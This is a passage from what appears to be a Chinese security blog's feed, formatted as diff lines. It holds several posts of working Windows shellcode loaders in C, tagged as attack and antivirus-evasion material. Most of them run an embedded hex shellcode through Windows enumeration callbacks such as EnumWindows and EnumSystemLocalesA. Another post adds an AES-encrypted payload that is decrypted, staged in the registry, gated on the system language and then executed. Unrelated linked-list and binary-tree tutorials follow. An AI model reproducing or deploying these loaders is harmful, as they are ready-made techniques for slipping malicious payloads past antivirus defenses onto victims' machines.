+&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
+HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+memcpy(hAlloc, shellcode, sizeof(shellcode));
+EnumSystemCodePagesA((CODEPAGE_ENUMPROCA)hAlloc ,0);
+}
+&lt;/code>&lt;/pre>&lt;h2 id="enumsystemcodepageswcpp">EnumSystemCodePagesW.cpp&lt;/h2>
+&lt;pre tabindex="0">&lt;code>//#include &amp;#34;stdafx.h&amp;#34;
+#include &amp;lt;Windows.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+using namespace std;
+// Create a string with last error message
+std::string GetLastErrorStdStr()
+{
+DWORD error = GetLastError();
+if (error)
+{
+LPVOID lpMsgBuf;
+DWORD bufLen = FormatMessage(
+FORMAT_MESSAGE_ALLOCATE_BUFFER |
+FORMAT_MESSAGE_FROM_SYSTEM |
+FORMAT_MESSAGE_IGNORE_INSERTS,
+NULL,
+error,
+MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+(LPTSTR)&amp;amp;lpMsgBuf,
+0, NULL);
+if (bufLen)
+{
+LPCSTR lpMsgStr = (LPCSTR)lpMsgBuf;
+std::string result(lpMsgStr, lpMsgStr + bufLen);
+LocalFree(lpMsgBuf);
+return result;
+}
+}
+return std::string();
+}
+int main()
+{
+char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
+&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
+&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
+&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
+&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
+&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
+&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
+&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
+&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
+&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
+&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
+&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
+&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
+&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
+HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+memcpy(hAlloc, shellcode, sizeof(shellcode));
+EnumSystemCodePagesW((CODEPAGE_ENUMPROCW)hAlloc, CP_INSTALLED);
+printf(GetLastErrorStdStr().c_str());
+VirtualFree(hAlloc,0, MEM_RELEASE);
+}
+&lt;/code>&lt;/pre>&lt;h2 id="enumsystemgeoidcpp">EnumSystemGeoID.cpp&lt;/h2>
+&lt;pre tabindex="0">&lt;code>//#include &amp;#34;stdafx.h&amp;#34;
+#include &amp;lt;Windows.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+int main()
+{
+char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
+&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
+&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
+&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
+&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
+&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
+&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
+&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
+&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
+&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
+&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
+&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
+&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
+&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
+HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+memcpy(hAlloc, shellcode, sizeof(shellcode));
+EnumSystemGeoID(GEOCLASS_NATION,0,(GEO_ENUMPROC) hAlloc);
+}
+&lt;/code>&lt;/pre>&lt;h2 id="enumsystemlanguagegroupsacpp">EnumSystemLanguageGroupsA.cpp&lt;/h2>
+&lt;pre tabindex="0">&lt;code>//#include &amp;#34;stdafx.h&amp;#34;
+#include &amp;lt;Windows.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+int main()
+{
+char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
+&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
+&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
+&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
+&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
+&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
+&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
+&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
+&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
+&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
+&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
+&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
+&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
+&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
+HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+memcpy(hAlloc, shellcode, sizeof(shellcode));
+EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA) hAlloc,LGRPID_SUPPORTED,0);
+}
+&lt;/code>&lt;/pre>&lt;h2 id="enumsystemlocalesacpp">EnumSystemLocalesA.cpp&lt;/h2>
+&lt;pre tabindex="0">&lt;code>
+//#include &amp;#34;stdafx.h&amp;#34;
+#include &amp;lt;Windows.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+int main()
+{
+char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
+&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
+&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
+&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
+&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
+&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
+&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
+&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
+&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
+&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
+&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
+&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
+&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
+&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
+HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+memcpy(hAlloc, shellcode, sizeof(shellcode));
+EnumSystemLocalesA((LOCALE_ENUMPROCA)hAlloc ,NULL);
+}
+&lt;/code>&lt;/pre>&lt;h2 id="enumthreadwindowscpp">EnumThreadWindows.cpp&lt;/h2>
+&lt;pre tabindex="0">&lt;code>//#include &amp;#34;stdafx.h&amp;#34;
+#include &amp;lt;Windows.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+int main()
+{
+char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
+&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
+&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
+&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
+&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
+&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
+&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
+&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
+&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
+&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
+&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
+&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
+&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
+&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
+HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+memcpy(hAlloc, shellcode, sizeof(shellcode));
+EnumThreadWindows(0,(WNDENUMPROC) hAlloc,0);
+}
+&lt;/code>&lt;/pre>&lt;h2 id="enumuilanguagesacpp">EnumUILanguagesA.cpp&lt;/h2>
+&lt;pre tabindex="0">&lt;code>//#include &amp;#34;stdafx.h&amp;#34;
+#include &amp;lt;Windows.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+int main()
+{
+char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
+&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
+&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
+&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
+&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
+&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
+&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
+&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
+&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
+&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
+&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
+&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
+&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
+&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
+HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+memcpy(hAlloc, shellcode, sizeof(shellcode));
+EnumUILanguagesA((UILANGUAGE_ENUMPROCA)hAlloc, MUI_LANGUAGE_ID, 0);
+}
+&lt;/code>&lt;/pre>&lt;h2 id="enumwindowscpp">EnumWindows.cpp&lt;/h2>
+&lt;pre tabindex="0">&lt;code>//#include &amp;#34;stdafx.h&amp;#34;
+#include &amp;lt;Windows.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+static BOOL CALLBACK EnumWindowCallback(HWND hWnd, LPARAM lparam) {
+//printf(&amp;#34;%S&amp;#34;, lparam);
+return true;
+}
+int main()
+{
+char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
+&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
+&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
+&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
+&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
+&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
+&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
+&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
+&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
+&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
+&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
+&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
+&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
+&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
+HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+memcpy(hAlloc, shellcode, sizeof(shellcode));
+EnumWindows((WNDENUMPROC)hAlloc, NULL);
+}
+&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/categories/%E6%94%BB/" term="攻" label="攻"/><category scheme="https://if1sh.com/categories/%E5%85%8D%E6%9D%80/" term="免杀" label="免杀"/><category scheme="https://if1sh.com/tags/%E5%85%8D%E6%9D%80/" term="免杀" label="免杀"/></entry><entry><title type="text">reg shellcode加载器</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/reg-shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/"/><id>https://if1sh.com/posts/reg-shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-02-20T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">#define _CRT_SECURE_NO_DEPRECATE #include &amp;#34;Base64.h&amp;#34; #include &amp;#34;AES.h&amp;#34; #include &amp;lt;Windows.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;Winnls.h&amp;gt; #pragma comment(lib,&amp;#34;Kernel32.lib&amp;#34;) #include &amp;lt;iostream&amp;gt; using namespace std; #define BUF_SIZE 4096 HKEY hKey; HKEY rootKey = HKEY_CURRENT_USER; DWORD cbData; static BOOL CALLBACK EnumWindowCallback(HWND hWnd, LPARAM lparam) { //printf(&amp;#34;%S&amp;#34;, lparam); return true;……</summary><content type="html">&lt;pre tabindex="0">&lt;code>
+#define _CRT_SECURE_NO_DEPRECATE
+#include &amp;#34;Base64.h&amp;#34;
+#include &amp;#34;AES.h&amp;#34;
+#include &amp;lt;Windows.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;Winnls.h&amp;gt;
+#pragma comment(lib,&amp;#34;Kernel32.lib&amp;#34;)
+#include &amp;lt;iostream&amp;gt;
+using namespace std;
+#define BUF_SIZE 4096
+HKEY hKey;
+HKEY rootKey = HKEY_CURRENT_USER;
+DWORD cbData;
+static BOOL CALLBACK EnumWindowCallback(HWND hWnd, LPARAM lparam) {
+//printf(&amp;#34;%S&amp;#34;, lparam);
+return true;
+}
+const char g_key[17] = &amp;#34;asdfwetyhjuytrfd&amp;#34;;
+const char g_iv[17] = &amp;#34;gfdertfghjkuyrtg&amp;#34;;//ECB MODE不需要关心chain，可以填空
+string DecryptionAES(const string&amp;amp; strSrc) //AES解密
+{
+string strData = base64_decode(strSrc);
+size_t length = strData.length();
+//密文
+char* szDataIn = new char[length + 1];
+memcpy(szDataIn, strData.c_str(), length + 1);
+//明文
+char* szDataOut = new char[length + 1];
+memcpy(szDataOut, strData.c_str(), length + 1);
+//进行AES的CBC模式解密
+AES aes;
+aes.MakeKey(g_key, g_iv, 16, 16);
+aes.Decrypt(szDataIn, szDataOut, length, AES::CBC);
+//去PKCS7Padding填充
+if (0x00 &amp;lt; szDataOut[length - 1] &amp;lt;= 0x16)
+{
+int tmp = szDataOut[length - 1];
+for (int i = length - 1; i &amp;gt;= length - tmp; i--)
+{
+if (szDataOut[i] != tmp)
+{
+memset(szDataOut, 0, length);
+cout &amp;lt;&amp;lt; &amp;#34;decode error&amp;#34; &amp;lt;&amp;lt; endl;
+break;
+}
+else
+szDataOut[i] = 0;
+}
+}
+string strDest(szDataOut);
+delete[] szDataIn;
+delete[] szDataOut;
+return strDest;
+}
+int main()
+{
+// check languge
+LANGID test_id = GetSystemDefaultLangID();
+if (test_id != 0x0804)
+{
+exit(0);
+}
+// 加密后的shellcode
+char buf[BUF_SIZE] = &amp;#34;R40EhbDwj5jt8m3+I4fffVYkiWaT0lsleSbIhcuTmsw4hhlpz3qBzvkOF+XErJ1WIRu4O2DxEQw1ha96wkT1jSk8bNivq/t6zWSSH76SL0SZ67hJqtcgk1tR/CtZwOX2n10YQ89lm7yohoaJZlpOZvNpy7hIYYH9IyAW6Uyd85IrcJPNgtwFIzkF+BSOD6z2F5JGeHLh8/EmsYlbx2H+BHtwyGPWTQBwhF9W2+NfcYFrR0IyJHFAiLFIKQDcn2wu39lc4IbYaP4rTbYj6k6oourqgNRNrOV50DZk2pXWg6PXFlZbH1wAZ9HyA7tbdPAH1hWhuIRFJU57YMre72dMHo3Mh8NsNyGF7QSYNvpIgyoMHchAEZFOb5HoD3LTkojacdNfYpnCy5RZS2XkUSehsaV5eX+kPuCFQ1jDZ1LYhl5BlyLyCrH2Ph2bqAQYw3HxlRR6JRyzamneMt5TlHtHWO2MBbNDdEg/E7hHgyWjBw9N/yw1/6UFCP/E1wsPbPADOty3q0Wn/V2TWsG7LMyQlLP8jQyD6lBjA8+7uOXulMg2IycCNzz7A4atD60uKTN8+IjM/sJUANkn6cmsylGpwQNsyxZQxK7dPFByPqdSx6OXxF0RbzXyKA5SUPbO0xZnjmj8+v2QJnf5nv2pywOKJyGuSq08tFfN1GXiNOsSzSdQr4HbHBsAVWLxagrrO/7b2tAp4xMl8rL3wtZXxm7QcYmCAXxJD2TeWeToqnTbCdUA2uWC3NzCojavXVQf1TSjJBtR3cAruKDfLfkPk4ss+IPntdy/LtM/ee0ST9965mBbOZfoCCRqCy9yM/toTmZ94HYmPOJr2Lwk2NVoYNeUquwCXiTTXkXCQWr4xP3Zm/In7zaS4XUQTXvbMkmMbzhCk9CCmwz308OzVP94+FNVUPWP9Y9vNHqj8XR4zZejmkdcgVn2eSFq4AYLJW+sctJvcG9NqcAW0goRZfqEE55fPq9AUUEFkpGxW4/D95FZzL2HlYySlM3VptXGYS4zxK9IahOaENjWYkCSt7vbgXXe3Y0qYeIdfShoyGm7lkiMzsh06trwxjry5efU4nIJx6T7KS5oVXTv0ly/G6qvs+Y4fePdPT5fRSppqqTIOWlsGWF/NJmzXzZnydtiymRe/oKFH+peqy2EmV3ua4r2AsVs9Z/hojI2WGMjwWvaZty7dq8YEgpAO1iBlgGVqigXpBZ4aCS3OKf4Omxhzk3/S/z6S/vtawAKa82rKvKra3KxmdigKDszgGZPBbnWDXcmrRQ/0z8ojknno7R9rlPF0p6o2tjUKldk6xi8dpCEXT/BKb18r4AR/nrw8OZLkXSDm0BJvX6o2D9SN5jkU+9DYI/Trz8AZtuFKEImw2LIkOtv5d7oYaG3i0qn/m63EqT95n1CSXZA+BKT/Sc2oxhDL0pJukI/sh848N64PorHZGxUs35ee6O5hfkhBSBqgGc2gF5hdqb+dkj7WqXROtMnyDI7yNTm8nYM+rdOoS7GlfKEQJhH3cK2pnLCDa9SFYA9ep3VEbjpcF8pcahspnTU6nHgDfoqhrg2bZLx9j69sx46768XpPjf8Bvjr/qmDIt4YwbbGKjPB/HenCsNBEmrm/p3DyLScYZupgl/jHeDyxB9XU6lYGXzDUxTnRUVp+e957Rtpz6J1w2v1gT9T+RF2dgK48fA5lQl7BhwLtOGTqVj5sTJoQk4N+8XGBCryU39LQGY+4RuC2KlIqGTRVMjMyPTTbVBt3ai396LTarjBwW2FMZEvQPu4hR+FMCm5rW0Qf6ZIYNMAaMwANd5TwWV2tzgUDQDrY6cyoZxNhUCIPDznlhPieQVJyCGZ8zahhsJbiW5jUi2UFZGeLaKppQjgsSddmPRcZ2DWyp21luqkMVkn5aAOLUzzxUZaShfBG4cD1tN3nFf5DW1xKdJSTygcpQlTNdGAmtPpjHgkOpMsB79m4/JWgwBCbPuUvOrZ0eMMx/MS1vQYK5GOmPykpeNIetAML+g3s7UJY+86UaIbaE2JqQ4PBWM/jEIW+JGSWE2Xt5qkIMLenvicwW6eQrlRLWpkiTKJ3oKo41uJm42y49goytHWZ/KPRU3pwD60YT21+86MgUvgPMfntyOBCU7bnitw4s9dev2bCvPZAPbhfRHlgBxEa7+e+EMuC1d+Zw8TX5B56cBCfWtrFB2Jg04tQp7bMPxifGusFyiFI9izUm8ea0XMDvMRgdPK1J7a+F0SArf7UbH5bMlPEVfZD7eXJB8k97QSy/6xIkUkaFlGrM5VqoGK03K/HMOa3FShN57LPMqyj8qYLz6zB7WqAvMEovZhL1GUHLa0OcRBl8BXsHrSkATcZmNcEYcRSF2ukPQWAWXWdDawTWYN8RH75DBGF4ngQ==&amp;#34;;
+// 解密shellcode
+string strbuf = DecryptionAES(buf);
+//cout &amp;lt;&amp;lt; &amp;#34;解密后shellcode：&amp;#34; &amp;lt;&amp;lt; strbuf &amp;lt;&amp;lt; endl;
+char buff[BUF_SIZE] = { 0 };
+for (int i = 0; i &amp;lt; strbuf.length(); i++) {
+buff[i] = strbuf[i];
+}
+// shellcode 处理，两个两个一起，还原成 \x00 的样子
+char* p = buff;
+unsigned char* shellcode = (unsigned char*)calloc(strlen(buff) / 2, sizeof(unsigned char));
+for (size_t i = 0; i &amp;lt; strlen(buff) / 2; i++) {
+sscanf(p, &amp;#34;%2hhx&amp;#34;, &amp;amp;shellcode[i]);
+p += 2;
+}
+SIZE_T bufSize = strlen(buff) / 2;
+printf(&amp;#34;Decrypted buffer:\n&amp;#34;);
+for (int i = 0; i &amp;lt; bufSize; i++) {
+printf(&amp;#34;\\x%02x&amp;#34;, shellcode[i]);
+}
+LSTATUS a = RegSetValueExA(rootKey, &amp;#34;HelloTest&amp;#34;, 0, 3, shellcode, bufSize);
+HANDLE HeapHandle = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
+BYTE* exec = (BYTE*)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, 0);
+LSTATUS b = RegQueryValueExA(rootKey, &amp;#34;HelloTest&amp;#34;, 0, 0, 0, &amp;amp;cbData);
+LSTATUS c = RegQueryValueExA(rootKey, &amp;#34;HelloTest&amp;#34;, 0, 0, exec, &amp;amp;cbData);
+if (c == ERROR_SUCCESS) {
+//EnumSystemLocalesA((LOCALE_ENUMPROCA)exec, 0);
+// EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)exec, LGRPID_SUPPORTED, 0);
+EnumWindows((WNDENUMPROC)exec, NULL);
+CloseHandle(exec);
+}
+}
+&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/categories/%E6%94%BB/" term="攻" label="攻"/><category scheme="https://if1sh.com/categories/%E5%85%8D%E6%9D%80/" term="免杀" label="免杀"/><category scheme="https://if1sh.com/tags/%E5%85%8D%E6%9D%80/" term="免杀" label="免杀"/></entry><entry><title type="text">c-单链表</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/c-%E5%8D%95%E9%93%BE%E8%A1%A8/"/><id>https://if1sh.com/posts/c-%E5%8D%95%E9%93%BE%E8%A1%A8/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-02-13T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">//定义节点 typedef struct node { int data; //节点存放数据 struct node *next; //指针域 } node; //定义头指针 typedef struct list { int……</summary><content type="html">&lt;pre tabindex="0">&lt;code>//定义节点
+typedef struct node {
+int data; //节点存放数据
+struct node *next; //指针域
+} node;
+//定义头指针
+typedef struct list {
+int size; //链表的长度
+struct node *next; //指针域
+} list;
+list *crete_list() {
+//用malloc开辟一块list大小的内存,返回一个list的指针
+list *l = malloc(sizeof(list));
+//判断申请内存是否成功
+if (l == NULL) {
+printf(&amp;#34;mem error&amp;#34;);
+return 0;
+}
+//初始化
+l-&amp;gt;size = 0; //头节点的数据域,用来表示链表的长度
+l-&amp;gt;next = NULL;
+return l;
+}
+node *crate_node() {
+node *n = malloc(sizeof(node));
+if (n == NULL) {
+printf(&amp;#34;mem error&amp;#34;);
+return 0;
+}
+n-&amp;gt;data = 0;
+n-&amp;gt;next = NULL;
+return n;
+}
+//头插
+int head_add(list *list, int data) {
+//新建空节点
+node *new_node = crate_node();
+new_node-&amp;gt;data = data;
+new_node-&amp;gt;next = list-&amp;gt;next;
+list-&amp;gt;next = new_node;
+list-&amp;gt;size++;
+return list;
+}
+//尾插
+int tail_add(list *list, int data) {
+node *new_node = crate_node();
+new_node-&amp;gt;data = data;
+node *last = list-&amp;gt;next;
+//如果last为NULL就证明是尾节点了,直接插入
+if (!last) {
+list-&amp;gt;next = new_node;
+} else {
+//当last的next值不是NULL,保存到last指针
+while (last-&amp;gt;next) {
+last = last-&amp;gt;next;
+}
+//新节点插入到last next
+last-&amp;gt;next = new_node;
+}
+list-&amp;gt;size++;
+return list;
+}
+//插入
+//链表的增加结点操作主要分为查找到第i个位置，将该位置的next指针修改为指向我们新插入的结点，而新插入的结点next指针指向我们i+1个位置的结点。其操作方式可以设置一个前驱结点，利用循环找到第i个位置，再进行插入。
+list *list_insert(list *list, int data, int pos) {
+node *curr = list;
+int i;
+for (i = 0; i &amp;lt; pos; i++) {
+curr = curr-&amp;gt;next; //查找第i个位置的前驱结点
+}
+//新建节点
+node *new_node = crate_node();
+//赋值节点data
+new_node-&amp;gt;data = data;
+//插入
+new_node-&amp;gt;next = curr-&amp;gt;next;
+curr-&amp;gt;next = new_node;
+/* 链表长度+1 */
+list-&amp;gt;size++;
+return list;
+}
+//删除节点
+list *list_del(list *list, int pos) {
+int i;
+node *curr = list;
+//遍历链表找到要删除的节点的下一个指针
+for (i = 0; i &amp;lt; pos; i++) {
+curr = curr-&amp;gt;next;
+}
+//临时记录被删除的节点
+node *temp = curr-&amp;gt;next;
+//删除节点
+curr-&amp;gt;next = curr-&amp;gt;next-&amp;gt;next;
+//释放掉被删除节点的内存
+free(temp);
+list-&amp;gt;size--;
+return list;
+}
+//删除值
+list *list_vul_del(list *list, int data) {
+node *curr;
+node *p = list-&amp;gt;next;
+while (p-&amp;gt;data != data) {
+curr = p;
+p = p-&amp;gt;next;
+}
+curr-&amp;gt;next = p-&amp;gt;next;
+free(p);
+list-&amp;gt;size--;
+return list;
+}
+void print_list(list *list) {
+//打印链表总长度
+printf(&amp;#34;len: %d\n&amp;#34;, list-&amp;gt;size);
+int i = 0;
+//list-&amp;gt;next值就是下一个节点的指针变量,每个节点都会保存着下一个节点的值
+node *p = list-&amp;gt;next;
+while (p) {
+printf(&amp;#34;第%d个元素的值为:%d\n&amp;#34;, ++i, p-&amp;gt;data);
+p = p-&amp;gt;next;
+}
+}
+int main() {
+list *l = crete_list();
+head_add(l, 1);
+head_add(l, 2);
+head_add(l, 10);
+tail_add(l, 100);
+tail_add(l, 111);
+list_insert(l, 520, 1);
+list_del(l, 2);
+list_vul_del(l, 520);
+print_list(l);
+}
+&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" term="数据结构" label="数据结构"/></entry><entry><title type="text">c-二叉树</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/c-%E4%BA%8C%E5%8F%89%E6%A0%91/"/><id>https://if1sh.com/posts/c-%E4%BA%8C%E5%8F%89%E6%A0%91/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-02-13T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; /* 树的节点 */ typedef struct tree_node { /* 左孩子指针 */ struct tree_node *left; /* 右孩子指针 */ struct tree_node *right; /* 关键字 */ char key; }tree_node;……</summary><content type="html">&lt;pre tabindex="0">&lt;code>#include &amp;lt;stdlib.h&amp;gt;
